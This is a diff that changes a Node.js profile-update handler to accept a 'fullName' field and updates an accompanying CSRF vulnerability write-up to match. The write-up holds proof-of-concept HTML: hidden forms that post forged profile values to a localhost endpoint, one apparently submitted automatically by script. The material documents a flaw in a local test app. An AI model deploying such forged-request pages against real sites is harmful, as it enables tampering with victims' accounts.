@@ -15,11 +15,12 @@ const handleProfileUpdate = (req, res) => {
   if (!req.user) {
     return res.status(401).json({ error: 'Authentication required.' });
   }
-  const { full_name, bio } = req.body;
+  const fullName = req.body.fullName || req.body.full_name || req.user.full_name;
+  const bio = req.body.bio !== undefined ? req.body.bio : req.user.bio;
   const db = getDB();
   db.prepare('UPDATE users SET full_name = ?, bio = ? WHERE id = ?').run(
-    full_name || req.user.full_name,
-    bio !== undefined ? bio : req.user.bio,
+    fullName,
+    bio,
     req.user.id
   );
   return res.json({ message: 'Profile updated successfully' });
@@ -49,10 +50,10 @@ res.cookie('session_token', token, {
 2. The browser receives the active session identifier and stores it in the cookie jar for `localhost:3000`.
 
 ### 3.2 Step 2: Attacker Exploit Webpage Setup:
-1. The attacker creates an external deceptive webpage `attacker_csrf_exploit.html` containing an invisible HTML form with forged input fields.
+1. The attacker creates an external deceptive webpage `attackerCsrfExploit.html` containing an invisible HTML form with forged input fields.
 ```html
 <form id="exploit" action="http://localhost:3000/api/auth/profile" method="POST">
-  <input type="hidden" name="full_name" value="Mridankan Mandal (Hijacked via CSRF)" />
+  <input type="hidden" name="fullName" value="Mridankan Mandal (Hijacked via CSRF)" />
   <input type="hidden" name="bio" value="Account profile compromised via Cross Site Request Forgery." />
 </form>
 <script>
@@ -76,7 +77,7 @@ res.cookie('session_token', token, {
 1. Forged Payload.
 ```html
 <form action="http://localhost:3000/api/auth/profile" method="POST">
-  <input type="hidden" name="full_name" value="Attacker Impersonator" />
+  <input type="hidden" name="fullName" value="Attacker Impersonator" />
   <input type="hidden" name="bio" value="This account has been compromised by an external malicious script." />
 </form>
 ```
